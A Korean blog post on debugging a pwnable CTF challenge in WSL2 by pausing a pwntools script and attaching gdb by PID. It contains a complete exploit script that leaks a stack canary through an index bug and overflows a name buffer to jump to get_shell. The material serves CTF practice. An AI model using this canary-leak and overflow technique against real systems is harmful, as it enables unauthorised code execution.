---
layout: post
title:  "Debugging in WSL2"
date:   2020-10-03
categories: ["2020","pwnable","tips"]
update: 2020-10-03
comment: true
tags: [pwnable,tips]
---


최근에 `WSL2`를 이용해서 pwnable 문제들을 풀고 있는데 pwnable이 오랜만이라 디버깅할 일이 많다.. 근데 자꾸 디버깅을 빨리빨리 못해서 시간이 끌리는 문제들이 많아서 연습할 겸 정리도 할겸 **Let's go** 😈

> 🚀 많이 배운 짱짱 블로그
>
> [https://cosyp.tistory.com/229](https://cosyp.tistory.com/229)

문제 풀면서 디버깅을 한 과정을 다시 밟아보자.
### 🔍Code

``` c
switch( select[0] ) {
            case 'F':
                printf("box input : ");
                read(0, box, sizeof(box));
                break;
            case 'P':
                printf("Element index : ");
                scanf("%d", &idx);
                print_box(box, idx);
                break;
            case 'E':
                printf("Name Size : ");
                scanf("%d", &name_len);
                printf("Name : ");
                read(0, name, name_len);
                return 0;
            default:
                break;
        }
```

필요한 부분만 가져왔다.

이 문제의 목표는

- `P`로 canary leak
- `E`로 BOF

이다.

쉬운 문제여서 코드 슥슥 짜서 돌렸는데 자꾸 canary값이 틀려서 `*** stack smashing detected ***`가 뜬다. 😭 그래서 디버깅을 해보기로 했다.

### 👀 Debugging

`canary`를 다 leak은 쉬우니까 leak한 후에 `BOF`를 하는 과정을 보자.

![image](https://user-images.githubusercontent.com/51329156/94966609-86a1f300-0538-11eb-94f7-453519661757.png)

gdb로 보면 필요한 값들의 위치를 알 수 있다.

- `name` : `ebp-0x48`
- `name_len` : `ebp-0x90`
- `canary` : `ebp-0x8`

확인해야할 점은 두 가지다.

- `name`에 입력 전 `canary`값
- `name`에 입력 후 `canary`값

이 걸 pwntools를 쓰면서 debugging을 하려면 Linux에서는 `gdb.attach(p)`하면 되는데 `WSL2`에서는 `gdb.attach(p)`가 안 된다.

그래서 코드를 이렇게 짜고:

#### 👓 part of ex.py :

``` python
def overWrite(nameLen,payload):
    p.sendlineafter("> ","E")
    p.recvuntil("Name Size : ")
    p.sendline(str(nameLen))
    p.recvuntil("Name : ")
    p.send(payload)
    pause() # stop here!

payload="A"*0x40
payload+=p32(canary,endian='big')
payload+=p32(0)
payload+=p32(0)
payload+=p32(get_shell)

pause() # stop here!
overWrite(0x80,payload)
```

다른 터미널에서 `gdb attach <pid>`를 해 줘야 한다.

![image](https://user-images.githubusercontent.com/51329156/94967162-848c6400-0539-11eb-92b6-2e5616c1344a.png)

3번 째 줄에 `pid`값이 나와있다. 저 값을 가지고 다른 터미널에서 `gdb attach 3097`을 해주면 저 프로세스에 gdb가 붙는다.

`gdb`가 저 프로세스에 붙는다고 해서,  코드의 실행이 멈추지 않기 때문에 `pause()`를 하지 않으면 코드가 끝까지 실행되서 종료해 버린다. 그래서 `bp`를 걸고 디버깅을 하고 싶어도 `bp`를 걸 수가 없다. 

그래서 디버깅을 하려면 위 코드처럼 `pause()` 혹은 `raw_input()`으로 코드의 실행을 멈춰서 `bp`를 걸 수 있는 시간을 벌어야 한다.

![image](https://user-images.githubusercontent.com/51329156/94966609-86a1f300-0538-11eb-94f7-453519661757.png)

#### 👻 Where to `pause()` and `bp`

**ex.py**를 다시 보면

``` python
def overWrite(nameLen,payload):
    p.sendlineafter("> ","E")
    p.recvuntil("Name Size : ")
    p.sendline(str(nameLen))
    p.recvuntil("Name : ")
    p.send(payload)
    pause() # stop here!

payload="A"*0x40
payload+=p32(canary,endian='big')
payload+=p32(0)
payload+=p32(0)
payload+=p32(get_shell)

pause() # stop here!
overWrite(0x80,payload)
```

1. payload를 보내기 전 후에 `pause()`가 걸려있다. 즉, `gdb`가 프로세스에 붙을 시점에는 `payload`가 전이다. 

2. 위 사진의 어셈블리 코드를 보면 `read()`가 있다. `bp`를 `0x08048864(main+313)`에다가 걸어준다. 

3. 그리고 `c(continue)`를 하면, `gdb` 입장에서는 `read`를 해야 하는데 프로세스가 아직 payload를 보내지 않은 상황이다. 그래서 `pause()`를 풀기 위해 아무 키나 입려해주면 프로세스가 입력을 보내게 되고 `c`가 자동으로 실행해서 `read()`한 상황을 디버깅 할 수 있다.

#### 🧰 Fix

**입력 전 `canary` 값**

![image](https://user-images.githubusercontent.com/51329156/94968353-b3a3d500-053b-11eb-8faf-4f7f5c0d5374.png)

**입력 후 덮어 쓴 `canary` 값**

![image](https://user-images.githubusercontent.com/51329156/94968381-bf8f9700-053b-11eb-8cff-7aee0064cf27.png)

endian이 거꾸로 되어서 들어가 있다. endian을 바꿔서 넣어주면 된다.👍

---

### 🔎 ex.py and shell

``` python
from pwn import *
import sys

if len(sys.argv)!=2:
    log.info("try 'python ex.py -l' for local")
    log.info("try 'python ex.py -r' for remote")
    exit(0)

if sys.argv[1]=="-r":
    p = remote('🤐',14195)
elif sys.argv[1]=="-l":
    p = process('🤐')
else:
    log.info("options: -l for local, -r for remote")
    exit(0)

e=ELF('🤐')

get_shell=e.symbols['get_shell']

canary=""

def canaryLeak(idx):
    p.sendlineafter("> ","P")
    p.recvuntil("Element index : ")
    p.sendline(str(idx))
    p.recv(26)
    return p.recv(2)

def overWrite(nameLen,payload):
    p.sendlineafter("> ","E")
    p.recvuntil("Name Size : ")
    p.sendline(str(nameLen))
    p.recvuntil("Name : ")
    p.send(payload)
    
canary+=canaryLeak(128)
canary+=canaryLeak(129)
canary+=canaryLeak(130)
canary+=canaryLeak(131)
canary=int(canary,16)

log.info("CANARY: "+hex(canary))

payload="A"*0x40
payload+=p32(canary,endian='big')
payload+=p32(0)
payload+=p32(0)
payload+=p32(get_shell)

overWrite(0x80,payload)

p.interactive()
```

![image-20201003054737199](C:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20201003054737199.png)

👏🏻👏🏻👏🏻

❗ 쉬운 문제에 생각보다 시간을 많이 끌렸지만 디버깅 연습은 제대로 된 거 같다. 사실 저번에 친구가 풀으라고 준 pwnable.tw에 `death_note` 풀면서 디버깅을 엄청 많이 했는데, 이제 진짜 잘할 수 있을 거 같다!